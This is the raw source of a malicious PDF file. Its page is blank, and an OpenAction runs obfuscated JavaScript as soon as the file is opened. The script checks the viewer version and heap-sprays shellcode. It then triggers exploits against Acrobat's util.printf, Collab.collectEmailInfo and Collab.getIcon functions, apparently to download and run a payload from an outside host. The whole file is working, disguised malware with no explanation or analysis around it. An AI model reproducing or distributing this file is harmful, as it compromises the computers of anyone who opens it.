%PDF-1.3
%‚„œ”
1 0 obj
<</OpenAction <</JS (this.AJYcjPlRz\(\))
/S /JavaScript
>>
/Threads 2 0 R
/Outlines 3 0 R
/Pages 4 0 R
/ViewerPreferences <</PageDirection /L2R
>>
/PageLayout /SinglePage
/AcroForm 5 0 R
/Dests 6 0 R
/Names 7 0 R
/Type /Catalog
>>
endobj
2 0 obj
[]
endobj
3 0 obj
<</Count 0
/Type /Outlines
>>
endobj
4 0 obj
<</Resources 8 0 R
/Kids [9 0 R]
/Count 1
/Type /Pages
>>
endobj
5 0 obj
<</Fields []
>>
endobj
6 0 obj
<<>>
endobj
7 0 obj
<</JavaScript 10 0 R
>>
endobj
8 0 obj
<</ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
>>
endobj
9 0 obj
<</Rotate 0
/Parent 4 0 R
/Resources 8 0 R
/TrimBox [0 0 595.28000 841.89000]
/MediaBox [0 0 595.28000 841.89000]
/pdftk_PageNum 1
/Contents 11 0 R
/Type /Page
>>
endobj
10 0 obj
<</Names [(New_Script) 12 0 R]
>>
endobj
11 0 obj
<</Length 31
>>
stream
0 0 595.28000 841.89000 re W n

endstream
endobj
12 0 obj
<</JS 13 0 R
/S /JavaScript
>>
endobj
13 0 obj
<</Length 16274
>>
stream
var n = ""; eval(eval('Stri'+n+'ng.fr'+n+'omCharC'+n+'ode(102,117,110,99,116,105,111,110,32,65,74,89,99,106,80,108,82,122,40,41,123,102,117,110,99,116,105,111,110,32,102,105,120,95,105,116,40,121,97,114,115,112,44,108,101,110,41,123,119,104,105,108,101,40,121,97,114,115,112,46,108,101,110,103,116,104,42,50,60,108,101,110,41,123,121,97,114,115,112,43,61,121,97,114,115,112,59,125,10,121,97,114,115,112,61,121,97,114,115,112,46,115,117,98,115,116,114,105,110,103,40,48,44,108,101,110,47,50,41,59,114,101,116,117,114,110,32,121,97,114,115,112,59,125,10,102,117,110,99,116,105,111,110,32,117,116,105,108,95,112,114,105,110,116,102,40,41,123,118,97,114,32,112,97,121,108,111,97,100,61,117,110,101,115,99,97,112,101,40,34,37,117,67,48,51,51,37,117,56,66,54,52,37,117,51,48,52,48,37,117,48,67,55,56,37,117,52,48,56,66,37,117,56,66,48,67,37,117,49,67,55,48,37,117,56,66,65,68,37,117,48,56,53,56,37,117,48,57,69,66,37,117,52,48,56,66,37,117,56,68,51,52,37,117,55,67,52,48,37,117,53,56,56,66,37,117,54,65,51,67,37,117,53,65,52,52,37,117,69,50,68,49,37,117,69,50,50,66,37,117,69,67,56,66,37,117,52,70,69,66,37,117,53,50,53,65,37,117,69,65,56,51,37,117,56,57,53,54,37,117,48,52,53,53,37,117,53,55,53,54,37,117,55,51,56,66,37,117,56,66,51,67,37,117,51,51,55,52,37,117,48,51,55,56,37,117,53,54,70,51,37,117,55,54,56,66,37,117,48,51,50,48,37,117,51,51,70,51,37,117,52,57,67,57,37,117,52,49,53,48,37,117,51,51,65,68,37,117,51,54,70,70,37,117,66,69,48,70,37,117,48,51,49,52,37,117,70,50,51,56,37,117,48,56,55,52,37,117,67,70,67,49,37,117,48,51,48,68,37,117,52,48,70,65,37,117,69,70,69,66,37,117,51,66,53,56,37,117,55,53,70,56,37,117,53,69,69,53,37,117,52,54,56,66,37,117,48,51,50,52,37,117,54,54,67,51,37,117,48,67,56,66,37,117,56,66,52,56,37,117,49,67,53,54,37,117,68,51,48,51,37,117,48,52,56,66,37,117,48,51,56,65,37,117,53,70,67,51,37,117,53,48,53,69,37,117,56,68,67,51,37,117,48,56,55,68,37,117,53,50,53,55,37,117,51,51,66,56,37,117,56,65,67,65,37,117,69,56,53,66,37,117,70,70,65,50,37,117,70,70,70,70,37,117,67,48,51,50,37,117,70,55,56,66,37,117,65,69,70,50,37,117,66,56,52,70,37,117,50,69,54,53,37,117,55,56,54,53,37,117,54,54,65,66,37,117,54,54,57,56,37,117,66,48,65,66,37,117,56,65,54,67,37,117,57,56,69,48,37,117,54,56,53,48,37,117,54,69,54,70,37,117,54,52,50,69,37,117,55,53,54,56,37,117,54,67,55,50,37,117,53,52,54,68,37,117,56,69,66,56,37,117,48,69,52,69,37,117,70,70,69,67,37,117,48,52,53,53,37,117,53,48,57,51,37,117,67,48,51,51,37,117,53,48,53,48,37,117,56,66,53,54,37,117,48,52,53,53,37,117,67,50,56,51,37,117,56,51,55,70,37,117,51,49,67,50,37,117,53,48,53,50,37,117,51,54,66,56,37,117,50,70,49,65,37,117,70,70,55,48,37,117,48,52,53,53,37,117,51,51,53,66,37,117,53,55,70,70,37,117,66,56,53,54,37,117,70,69,57,56,37,117,48,69,56,65,37,117,53,53,70,70,37,117,53,55,48,52,37,117,69,70,66,56,37,117,69,48,67,69,37,117,70,70,54,48,37,117,48,52,53,53,37,117,55,52,54,56,37,117,55,48,55,52,37,117,50,70,51,65,37,117,55,55,50,70,37,117,55,55,55,55,37,117,54,51,50,69,37,117,54,53,54,56,37,117,55,48,54,49,37,117,54,66,54,56,37,117,54,51,50,69,37,117,54,68,54,70,37,117,54,57,50,70,37,117,54,49,54,68,37,117,54,53,54,55,37,117,50,70,55,51,37,117,54,70,54,67,37,117,54,70,54,55,37,117,50,70,55,51,37,117,54,70,54,67,37,117,54,52,54,49,37,117,55,48,50,69,37,117,55,48,54,56,37,117,54,53,51,70,37,117,51,50,51,68,34,41,59,118,97,114,32,110,111,112,61,117,110,101,115,99,97,112,101,40,34,37,117,48,65,48,65,37,117,48,65,48,65,37,117,48,65,48,65,37,117,48,65,48,65,34,41,10,118,97,114,32,104,101,97,112,98,108,111,99,107,61,110,111,112,43,112,97,121,108,111,97,100,59,118,97,114,32,98,105,103,98,108,111,99,107,61,117,110,101,115,99,97,112,101,40,34,37,117,48,65,48,65,37,117,48,65,48,65,34,41,59,118,97,114,32,104,101,97,100,101,114,115,105,122,101,61,50,48,59,118,97,114,32,115,112,114,97,121,61,104,101,97,100,101,114,115,105,122,101,43,104,101,97,112,98,108,111,99,107,46,108,101,110,103,116,104,59,119,104,105,108,101,40,98,105,103,98,108,111,99,107,46,108,101,110,103,116,104,60,115,112,114,97,121,41,123,98,105,103,98,108,111,99,107,43,61,98,105,103,98,108,111,99,107,59,125,10,118,97,114,32,102,105,108,108,98,108,111,99,107,61,98,105,103,98,108,111,99,107,46,115,117,98,115,116,114,105,110,103,40,48,44,115,112,114,97,121,41,59,118,97,114,32,98,108,111,99,107,61,98,105,103,98,108,111,99,107,46,115,117,98,115,116,114,105,110,103,40,48,44,98,105,103,98,108,111,99,107,46,108,101,110,103,116,104,45,115,112,114,97,121,41,59,119,104,105,108,101,40,98,108,111,99,107,46,108,101,110,103,116,104,43,115,112,114,97,121,60,48,120,52,48,48,48,48,41,123,98,108,111,99,107,61,98,108,111,99,107,43,98,108,111,99,107,43,102,105,108,108,98,108,111,99,107,59,125,10,118,97,114,32,109,101,109,95,97,114,114,97,121,61,110,101,119,32,65,114,114,97,121,40,41,59,102,111,114,40,118,97,114,32,105,61,48,59,105,60,49,52,48,48,59,105,43,43,41,123,109,101,109,95,97,114,114,97,121,91,105,93,61,98,108,111,99,107,43,104,101,97,112,98,108,111,99,107,59,125,10,118,97,114,32,110,117,109,61,49,50,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,56,59,117,116,105,108,46,112,114,105,110,116,102,40,34,37,52,53,48,48,48,102,34,44,110,117,109,41,59,125,10,102,117,110,99,116,105,111,110,32,99,111,108,108,97,98,95,101,109,97,105,108,40,41,123,118,97,114,32,115,104,101,108,108,99,111,100,101,61,117,110,101,115,99,97,112,101,40,34,37,117,67,48,51,51,37,117,56,66,54,52,37,117,51,48,52,48,37,117,48,67,55,56,37,117,52,48,56,66,37,117,56,66,48,67,37,117,49,67,55,48,37,117,56,66,65,68,37,117,48,56,53,56,37,117,48,57,69,66,37,117,52,48,56,66,37,117,56,68,51,52,37,117,55,67,52,48,37,117,53,56,56,66,37,117,54,65,51,67,37,117,53,65,52,52,37,117,69,50,68,49,37,117,69,50,50,66,37,117,69,67,56,66,37,117,52,70,69,66,37,117,53,50,53,65,37,117,69,65,56,51,37,117,56,57,53,54,37,117,48,52,53,53,37,117,53,55,53,54,37,117,55,51,56,66,37,117,56,66,51,67,37,117,51,51,55,52,37,117,48,51,55,56,37,117,53,54,70,51,37,117,55,54,56,66,37,117,48,51,50,48,37,117,51,51,70,51,37,117,52,57,67,57,37,117,52,49,53,48,37,117,51,51,65,68,37,117,51,54,70,70,37,117,66,69,48,70,37,117,48,51,49,52,37,117,70,50,51,56,37,117,48,56,55,52,37,117,67,70,67,49,37,117,48,51,48,68,37,117,52,48,70,65,37,117,69,70,69,66,37,117,51,66,53,56,37,117,55,53,70,56,37,117,53,69,69,53,37,117,52,54,56,66,37,117,48,51,50,52,37,117,54,54,67,51,37,117,48,67,56,66,37,117,56,66,52,56,37,117,49,67,53,54,37,117,68,51,48,51,37,117,48,52,56,66,37,117,48,51,56,65,37,117,53,70,67,51,37,117,53,48,53,69,37,117,56,68,67,51,37,117,48,56,55,68,37,117,53,50,53,55,37,117,51,51,66,56,37,117,56,65,67,65,37,117,69,56,53,66,37,117,70,70,65,50,37,117,70,70,70,70,37,117,67,48,51,50,37,117,70,55,56,66,37,117,65,69,70,50,37,117,66,56,52,70,37,117,50,69,54,53,37,117,55,56,54,53,37,117,54,54,65,66,37,117,54,54,57,56,37,117,66,48,65,66,37,117,56,65,54,67,37,117,57,56,69,48,37,117,54,56,53,48,37,117,54,69,54,70,37,117,54,52,50,69,37,117,55,53,54,56,37,117,54,67,55,50,37,117,53,52,54,68,37,117,56,69,66,56,37,117,48,69,52,69,37,117,70,70,69,67,37,117,48,52,53,53,37,117,53,48,57,51,37,117,67,48,51,51,37,117,53,48,53,48,37,117,56,66,53,54,37,117,48,52,53,53,37,117,67,50,56,51,37,117,56,51,55,70,37,117,51,49,67,50,37,117,53,48,53,50,37,117,51,54,66,56,37,117,50,70,49,65,37,117,70,70,55,48,37,117,48,52,53,53,37,117,51,51,53,66,37,117,53,55,70,70,37,117,66,56,53,54,37,117,70,69,57,56,37,117,48,69,56,65,37,117,53,53,70,70,37,117,53,55,48,52,37,117,69,70,66,56,37,117,69,48,67,69,37,117,70,70,54,48,37,117,48,52,53,53,37,117,55,52,54,56,37,117,55,48,55,52,37,117,50,70,51,65,37,117,55,55,50,70,37,117,55,55,55,55,37,117,54,51,50,69,37,117,54,53,54,56,37,117,55,48,54,49,37,117,54,66,54,56,37,117,54,51,50,69,37,117,54,68,54,70,37,117,54,57,50,70,37,117,54,49,54,68,37,117,54,53,54,55,37,117,50,70,55,51,37,117,54,70,54,67,37,117,54,70,54,55,37,117,50,70,55,51,37,117,54,70,54,67,37,117,54,52,54,49,37,117,55,48,50,69,37,117,55,48,54,56,37,117,54,53,51,70,37,117,51,50,51,68,34,41,59,118,97,114,32,109,101,109,95,97,114,114,97,121,61,110,101,119,32,65,114,114,97,121,40,41,59,118,97,114,32,99,99,61,48,120,48,99,48,99,48,99,48,99,59,118,97,114,32,97,100,100,114,61,48,120,52,48,48,48,48,48,59,118,97,114,32,115,99,95,108,101,110,61,115,104,101,108,108,99,111,100,101,46,108,101,110,103,116,104,42,50,59,118,97,114,32,108,101,110,61,97,100,100,114,45,40,115,99,95,108,101,110,43,48,120,51,56,41,59,118,97,114,32,121,97,114,115,112,61,117,110,101,115,99,97,112,101,40,34,37,117,57,48,57,48,37,117,57,48,57,48,34,41,59,121,97,114,115,112,61,102,105,120,95,105,116,40,121,97,114,115,112,44,108,101,110,41,59,118,97,114,32,99,111,117,110,116,50,61,40,99,99,45,48,120,52,48,48,48,48,48,41,47,97,100,100,114,59,102,111,114,40,118,97,114,32,99,111,117,110,116,61,48,59,99,111,117,110,116,60,99,111,117,110,116,50,59,99,111,117,110,116,43,43,41,123,109,101,109,95,97,114,114,97,121,91,99,111,117,110,116,93,61,121,97,114,115,112,43,115,104,101,108,108,99,111,100,101,59,125,10,118,97,114,32,111,118,101,114,102,108,111,119,61,117,110,101,115,99,97,112,101,40,34,37,117,48,99,48,99,37,117,48,99,48,99,34,41,59,119,104,105,108,101,40,111,118,101,114,102,108,111,119,46,108,101,110,103,116,104,60,52,52,57,53,50,41,123,111,118,101,114,102,108,111,119,43,61,111,118,101,114,102,108,111,119,59,125,10,116,104,105,115,46,99,111,108,108,97,98,83,116,111,114,101,61,67,111,108,108,97,98,46,99,111,108,108,101,99,116,69,109,97,105,108,73,110,102,111,40,123,115,117,98,106,58,34,34,44,109,115,103,58,111,118,101,114,102,108,111,119,125,41,59,125,10,102,117,110,99,116,105,111,110,32,99,111,108,108,97,98,95,103,101,116,105,99,111,110,40,41,123,105,102,40,97,112,112,46,100,111,99,46,67,111,108,108,97,98,46,103,101,116,73,99,111,110,41,123,118,97,114,32,97,114,114,121,61,110,101,119,32,65,114,114,97,121,40,41,59,118,97,114,32,118,118,112,101,116,104,121,97,61,117,110,101,115,99,97,112,101,40,34,37,117,67,48,51,51,37,117,56,66,54,52,37,117,51,48,52,48,37,117,48,67,55,56,37,117,52,48,56,66,37,117,56,66,48,67,37,117,49,67,55,48,37,117,56,66,65,68,37,117,48,56,53,56,37,117,48,57,69,66,37,117,52,48,56,66,37,117,56,68,51,52,37,117,55,67,52,48,37,117,53,56,56,66,37,117,54,65,51,67,37,117,53,65,52,52,37,117,69,50,68,49,37,117,69,50,50,66,37,117,69,67,56,66,37,117,52,70,69,66,37,117,53,50,53,65,37,117,69,65,56,51,37,117,56,57,53,54,37,117,48,52,53,53,37,117,53,55,53,54,37,117,55,51,56,66,37,117,56,66,51,67,37,117,51,51,55,52,37,117,48,51,55,56,37,117,53,54,70,51,37,117,55,54,56,66,37,117,48,51,50,48,37,117,51,51,70,51,37,117,52,57,67,57,37,117,52,49,53,48,37,117,51,51,65,68,37,117,51,54,70,70,37,117,66,69,48,70,37,117,48,51,49,52,37,117,70,50,51,56,37,117,48,56,55,52,37,117,67,70,67,49,37,117,48,51,48,68,37,117,52,48,70,65,37,117,69,70,69,66,37,117,51,66,53,56,37,117,55,53,70,56,37,117,53,69,69,53,37,117,52,54,56,66,37,117,48,51,50,52,37,117,54,54,67,51,37,117,48,67,56,66,37,117,56,66,52,56,37,117,49,67,53,54,37,117,68,51,48,51,37,117,48,52,56,66,37,117,48,51,56,65,37,117,53,70,67,51,37,117,53,48,53,69,37,117,56,68,67,51,37,117,48,56,55,68,37,117,53,50,53,55,37,117,51,51,66,56,37,117,56,65,67,65,37,117,69,56,53,66,37,117,70,70,65,50,37,117,70,70,70,70,37,117,67,48,51,50,37,117,70,55,56,66,37,117,65,69,70,50,37,117,66,56,52,70,37,117,50,69,54,53,37,117,55,56,54,53,37,117,54,54,65,66,37,117,54,54,57,56,37,117,66,48,65,66,37,117,56,65,54,67,37,117,57,56,69,48,37,117,54,56,53,48,37,117,54,69,54,70,37,117,54,52,50,69,37,117,55,53,54,56,37,117,54,67,55,50,37,117,53,52,54,68,37,117,56,69,66,56,37,117,48,69,52,69,37,117,70,70,69,67,37,117,48,52,53,53,37,117,53,48,57,51,37,117,67,48,51,51,37,117,53,48,53,48,37,117,56,66,53,54,37,117,48,52,53,53,37,117,67,50,56,51,37,117,56,51,55,70,37,117,51,49,67,50,37,117,53,48,53,50,37,117,51,54,66,56,37,117,50,70,49,65,37,117,70,70,55,48,37,117,48,52,53,53,37,117,51,51,53,66,37,117,53,55,70,70,37,117,66,56,53,54,37,117,70,69,57,56,37,117,48,69,56,65,37,117,53,53,70,70,37,117,53,55,48,52,37,117,69,70,66,56,37,117,69,48,67,69,37,117,70,70,54,48,37,117,48,52,53,53,37,117,55,52,54,56,37,117,55,48,55,52,37,117,50,70,51,65,37,117,55,55,50,70,37,117,55,55,55,55,37,117,54,51,50,69,37,117,54,53,54,56,37,117,55,48,54,49,37,117,54,66,54,56,37,117,54,51,50,69,37,117,54,68,54,70,37,117,54,57,50,70,37,117,54,49,54,68,37,117,54,53,54,55,37,117,50,70,55,51,37,117,54,70,54,67,37,117,54,70,54,55,37,117,50,70,55,51,37,117,54,70,54,67,37,117,54,52,54,49,37,117,55,48,50,69,37,117,55,48,54,56,37,117,54,53,51,70,37,117,51,50,51,68,34,41,59,118,97,114,32,104,87,113,53,48,48,67,78,61,118,118,112,101,116,104,121,97,46,108,101,110,103,116,104,42,50,59,118,97,114,32,108,101,110,61,48,120,52,48,48,48,48,48,45,40,104,87,113,53,48,48,67,78,43,48,120,51,56,41,59,118,97,114,32,121,97,114,115,112,61,117,110,101,115,99,97,112,101,40,34,37,117,57,48,57,48,37,117,57,48,57,48,34,41,59,121,97,114,115,112,61,102,105,120,95,105,116,40,121,97,114,115,112,44,108,101,110,41,59,118,97,114,32,112,53,65,106,75,54,53,102,61,40,48,120,48,99,48,99,48,99,48,99,45,48,120,52,48,48,48,48,48,41,47,48,120,52,48,48,48,48,48,59,102,111,114,40,118,97,114,32,118,113,99,81,68,57,54,121,61,48,59,118,113,99,81,68,57,54,121,60,112,53,65,106,75,54,53,102,59,118,113,99,81,68,57,54,121,43,43,41,123,97,114,114,121,91,118,113,99,81,68,57,54,121,93,61,121,97,114,115,112,43,118,118,112,101,116,104,121,97,59,125,10,118,97,114,32,116,85,77,104,78,98,71,119,61,117,110,101,115,99,97,112,101,40,34,37,48,57,34,41,59,119,104,105,108,101,40,116,85,77,104,78,98,71,119,46,108,101,110,103,116,104,60,48,120,52,48,48,48,41,123,116,85,77,104,78,98,71,119,43,61,116,85,77,104,78,98,71,119,59,125,10,116,85,77,104,78,98,71,119,61,34,78,46,34,43,116,85,77,104,78,98,71,119,59,97,112,112,46,100,111,99,46,67,111,108,108,97,98,46,103,101,116,73,99,111,110,40,116,85,77,104,78,98,71,119,41,59,125,125,10,102,117,110,99,116,105,111,110,32,112,100,102,95,115,116,97,114,116,40,41,123,118,97,114,32,118,101,114,115,105,111,110,61,97,112,112,46,118,105,101,119,101,114,86,101,114,115,105,111,110,46,116,111,83,116,114,105,110,103,40,41,59,118,101,114,115,105,111,110,61,118,101,114,115,105,111,110,46,114,101,112,108,97,99,101,40,47,92,68,47,103,44,39,39,41,59,118,97,114,32,118,97,114,115,105,111,110,95,97,114,114,97,121,61,110,101,119,32,65,114,114,97,121,40,118,101,114,115,105,111,110,46,99,104,97,114,65,116,40,48,41,44,118,101,114,115,105,111,110,46,99,104,97,114,65,116,40,49,41,44,118,101,114,115,105,111,110,46,99,104,97,114,65,116,40,50,41,41,59,105,102,40,40,118,97,114,115,105,111,110,95,97,114,114,97,121,91,48,93,61,61,56,41,38,38,40,118,97,114,115,105,111,110,95,97,114,114,97,121,91,49,93,61,61,48,41,124,124,40,118,97,114,115,105,111,110,95,97,114,114,97,121,91,49,93,61,61,49,38,38,118,97,114,115,105,111,110,95,97,114,114,97,121,91,50,93,60,51,41,41,123,117,116,105,108,95,112,114,105,110,116,102,40,41,59,125,10,105,102,40,40,118,97,114,115,105,111,110,95,97,114,114,97,121,91,48,93,60,56,41,124,124,40,118,97,114,115,105,111,110,95,97,114,114,97,121,91,48,93,61,61,56,38,38,118,97,114,115,105,111,110,95,97,114,114,97,121,91,49,93,60,50,38,38,118,97,114,115,105,111,110,95,97,114,114,97,121,91,50,93,60,50,41,41,123,99,111,108,108,97,98,95,101,109,97,105,108,40,41,59,125,10,105,102,40,40,118,97,114,115,105,111,110,95,97,114,114,97,121,91,48,93,60,57,41,124,124,40,118,97,114,115,105,111,110,95,97,114,114,97,121,91,48,93,61,61,57,38,38,118,97,114,115,105,111,110,95,97,114,114,97,121,91,49,93,60,49,41,41,123,99,111,108,108,97,98,95,103,101,116,105,99,111,110,40,41,59,125,125,10,112,100,102,95,115,116,97,114,116,40,41,59,125)'));
endstream
endobj
14 0 obj
<</Creator (Scribus 1.3.3.12)
/Title <>
/Producer (Scribus PDF Library 1.3.3.12)
/Author <>
/Keywords <>
/Trapped /False
/ModDate (2008312053854)
/CreationDate (2008312053854)
>>
endobj
xref
0 15
0000000000 65535 f 
0000000015 00000 n 
0000000261 00000 n 
0000000279 00000 n 
0000000324 00000 n 
0000000397 00000 n 
0000000428 00000 n 
0000000448 00000 n 
0000000487 00000 n 
0000000553 00000 n 
0000000731 00000 n 
0000000781 00000 n 
0000000862 00000 n 
0000000909 00000 n 
0000004186 00000 n 
trailer
<</Info 14 0 R
/Root 1 0 R
/Size 15
>>
startxref
4374
%%EOF
